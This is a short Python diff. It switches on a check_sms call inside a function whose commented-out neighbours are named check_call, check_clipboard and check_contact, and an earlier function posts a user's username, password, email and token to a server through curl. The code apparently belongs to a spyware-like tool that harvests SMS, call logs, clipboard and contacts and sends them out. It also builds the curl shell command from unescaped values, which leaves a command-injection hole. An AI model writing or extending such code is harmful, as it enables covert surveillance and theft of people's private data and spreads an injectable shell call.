@@ -55,8 +55,7 @@ def register_server(THIS_USER_TOKEN):
     os.system(f'curl --data "username={this_user.username}&password={this_user.password}&email={this_user.email}&token={THIS_USER_TOKEN}" {SERVER_URL}/register/')
 
 def InsertIntoDb(THIS_USER_TOKEN):
-    pass
-    # check_sms(THIS_USER_TOKEN)
+    check_sms(THIS_USER_TOKEN)
     # check_call(THIS_USER_TOKEN)
     # check_clipboard(THIS_USER_TOKEN)
     # check_contact(THIS_USER_TOKEN)
